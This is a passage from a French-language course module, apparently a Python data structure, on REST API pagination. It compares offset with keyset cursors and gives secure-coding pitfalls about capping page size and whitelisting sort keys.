            "  Table SQL : [Ligne 1 .................... Ligne 99980] ---> [Lignes 99981 à 100000]\n"
            "               \\___ Balayage séquentiel coûteux O(N) __/       \\__ Renvoyées (20) __/\n\n"
            "  [B] CURSEUR KEYSET (?after_id=99980&limit=20 -> WHERE id > 99980 LIMIT 20) :\n"
            "  Index B-Tree sur 'id' ----(Saut direct O(1))----> [Lignes 99981 à 100000]\n"
            "                                                     \\__ Renvoyées en < 1ms + next_cursor=100000"
        ),
        "reference_table": {
            "title": "Comparatif Industriel : Pagination `Offset/Limit` vs Pagination par `Curseur (Keyset)`",
            "headers": ["Critère d'Ingénierie", "Pagination `Offset / Limit` (`?page=2&per_page=20`)", "Pagination `Curseur / Keyset` (`?after_id=1042&limit=20`)"],
            "rows": [
                ["Requête SQL sous-jacente", "`SELECT * FROM table ORDER BY id LIMIT ? OFFSET ?`", "`SELECT * FROM table WHERE id > ? ORDER BY id LIMIT ?`"],
                ["Complexité algorithmique SQL", "$O(N)$ — Ralentit à mesure que `OFFSET` augmente", "$O(1)$ — Temps constant ultra-rapide via l'index B-Tree"],
                ["Saut direct vers une page (`Page 14`)", "Oui (idéal pour les grilles Web numérotées)", "Non (navigation séquentielle *Suivant / Précédent*)"],
                ["Stabilité en cas d'insertion temps réel", "Risque de décalage (un élément peut apparaître 2 fois)", "100 % stable (ancré sur l'identifiant unique `after_id`)"]
            ]
        },
        "pitfalls": [
            {
                "bad": "Accepter le paramètre `?per_page=` ou `?limit=` du client sans imposer de plafond maximum côté serveur",
                "good": "Toujours borner la limite : `per_page = min(50, max(1, request.args.get('per_page', 20, type=int)))`",
                "why": "Sans plafond `min(50, ...)`, un attaquant peut envoyer `?per_page=99999999` et provoquer un déni de service par saturation RAM."
            },
            {
                "bad": "Injecter directement le paramètre `?sort=` dans une requête SQL sans validation",
                "good": "Valider systématiquement la clé de tri contre un `set` Python (`CHAMPS_TRI_AUTORISES`) et renvoyer `422` en cas d'écart",
                "why": "C'est le seul moyen d'autoriser un tri dynamique tout en garantissant l'impossibilité absolue d'une injection SQL."
            }
        ],
        "practical_exercises": [
            "Exécutez `day_5/02_pagination_filtrage_production.py` et observez comment `next_cursor` dans `/api/v1/catalogue/cursor` permet de parcourir toute la collection de 2 en 2 jusqu'à ce que `next_cursor` vaille `None`.",
            "Ajoutez un paramètre `?fields=id,titre` (*Sparse Fieldsets*) qui permet au client de ne recevoir que les colonnes demandées pour économiser la bande passante mobile."
        ]
    }
}
